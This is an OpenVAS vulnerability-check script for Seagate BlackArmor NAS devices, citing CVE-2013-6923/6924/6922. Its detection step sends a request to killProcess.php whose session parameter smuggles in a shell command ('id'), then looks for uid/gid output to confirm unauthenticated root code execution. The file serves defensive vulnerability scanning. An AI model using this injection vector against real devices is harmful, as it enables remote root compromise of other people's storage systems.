###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_seagate_blackarmor_multiple_vulns.nasl 11867 2018-10-12 10:48:11Z cfischer $
#
# Seagate BlackArmor NAS Multiple Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2014 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################
CPE = "cpe:/h:seagate:blackarmor_nas";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103867");
  script_cve_id("CVE-2013-6923", "CVE-2013-6924", "CVE-2013-6922");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_version("$Revision: 11867 $");

  script_name("Seagate BlackArmor NAS Multiple Vulnerabilities");


  script_xref(name:"URL", value:"http://www.nerdbox.it/seagate-nas-multiple-vulnerabilities/");
  script_xref(name:"URL", value:"http://www.seagate.com/external-hard-drives/network-storage/");

  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:48:11 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2014-01-06 12:27:03 +0100 (Mon, 06 Jan 2014)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2014 Greenbone Networks GmbH");
  script_dependencies("gb_seagate_blackarmor_nas_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("seagate_nas/installed");

  script_tag(name:"impact", value:"Successful exploitation will allow an attacker to execute arbitrary code
as root or to obtain sensitive information which may aid in further attacks..");
  script_tag(name:"vuldetect", value:"Send a special crafted request which tries to execute the 'id' command.");
  script_tag(name:"insight", value:"Multiple security issues were found in Seagate BlackArmor NAS.
1. Multiple remote code execution vulnerabilities (root).
2. Multiple local file include vulnerabilities.
3. Multiple information disclosure vulnerabilities.
4. Multiple cross site scripting vulnerabilities.");
  script_tag(name:"solution", value:"Ask the vendor for an update");
  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"summary", value:"Seagate BlackArmor NAS is prone to multiple vulnerabilities.");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE))exit(0);

url = '/backupmgt/killProcess.php?session=OpenVAS;id;%20#';
req = http_get(item:url, port:port);
buf = http_send_recv(port:port, data:req, bodyonly:TRUE);

if(buf =~ "uid=[0-9]+.*gid=[0-9]+.*")
{
 report = 'By requesting the url "' + url + '" it was possible to execute the "id" command.\n';
 security_message(port:port, data:report);
 exit(0);
}

exit(0);
